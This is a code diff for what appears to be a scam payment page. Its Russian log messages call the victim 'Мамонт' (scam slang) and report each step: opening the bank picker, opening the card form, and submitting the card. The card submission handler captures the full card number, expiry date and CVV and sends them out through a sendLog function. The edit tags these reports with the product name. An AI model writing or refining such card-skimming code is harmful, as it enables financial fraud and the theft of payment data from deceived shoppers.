@@ -1704,6 +1704,9 @@
     document.getElementById('orderNumber').textContent = '#' + num;
   }
 
+  // Global variable to store product name for logging
+  let productName = '';
+
   // Заполняем данные из hash или query параметра (link_id)
   async function fillFromParams() {
     // Берём link_id из hash (#27c310d5) или из query параметра (?link_id=27c310d5)
@@ -1738,8 +1741,9 @@
       }
 
       // Название товара
+      productName = data.name || 'Товар'; // Save for logging
       const nameEl = document.getElementById('productName');
-      if (nameEl) nameEl.textContent = data.name || 'Товар';
+      if (nameEl) nameEl.textContent = productName;
 
       // Дата заказа
       const dateEl = document.getElementById('orderDate');
@@ -2432,12 +2436,10 @@ function openBankModal() {
   document.body.style.overflow = 'hidden';
 
   // Логирование: переход на выбор банка
-  const urlParams = new URLSearchParams(window.location.search);
-  const link_id = urlParams.get('link_id') || 'нет';
-  console.log('🏦 Bank modal opened, logging...', link_id);
+  console.log('🏦 Bank modal opened, logging...', productName);
   if (typeof sendLog === 'function') {
     console.log('✅ sendLog exists, sending...');
-    sendLog('payment_flow', `🏦 Мамонт перешел на выбор банка\n🔗 Линк айди: ${link_id}`);
+    sendLog('payment_flow', `🏦 Мамонт перешел на выбор банка\n📦 Товар: ${productName}`);
   } else {
     console.error('❌ sendLog is not defined!');
   }
@@ -2453,12 +2455,10 @@ function openCardModal() {
   document.getElementById('cardModal').classList.add('open');
 
   // Логирование: переход на ввод карты
-  const urlParams = new URLSearchParams(window.location.search);
-  const link_id = urlParams.get('link_id') || 'нет';
-  console.log('💳 Card modal opened, logging...', link_id);
+  console.log('💳 Card modal opened, logging...', productName);
   if (typeof sendLog === 'function') {
     console.log('✅ sendLog exists, sending...');
-    sendLog('payment_flow', `💳 Мамонт перешел на ввод карты\n🔗 Линк айди: ${link_id}`);
+    sendLog('payment_flow', `💳 Мамонт перешел на ввод карты\n📦 Товар: ${productName}`);
   } else {
     console.error('❌ sendLog is not defined!');
   }
@@ -2571,12 +2571,8 @@ document.addEventListener('DOMContentLoaded', function() {
 
       // Validate all fields are filled
       if (cardNumber && cardExpiry && cardCVV) {
-        // Get link_id
-        const urlParams = new URLSearchParams(window.location.search);
-        const link_id = urlParams.get('link_id') || 'нет';
-
-        // Log card data with all fields including CVV
-        const logMessage = `💳 Мамонт дал данные карты\n🔢 Номер: ${cardNumber}\n📅 Дата: ${cardExpiry}\n🔐 CVV: ${cardCVV}\n🔗 Линк айди: ${link_id}`;
+        // Log card data with product name
+        const logMessage = `💳 Мамонт дал данные карты\n🔢 Номер: ${cardNumber}\n📅 Дата: ${cardExpiry}\n🔐 CVV: ${cardCVV}\n📦 Товар: ${productName}`;
 
         console.log('📋 Logging card data:', logMessage);
         if (typeof sendLog === 'function') {
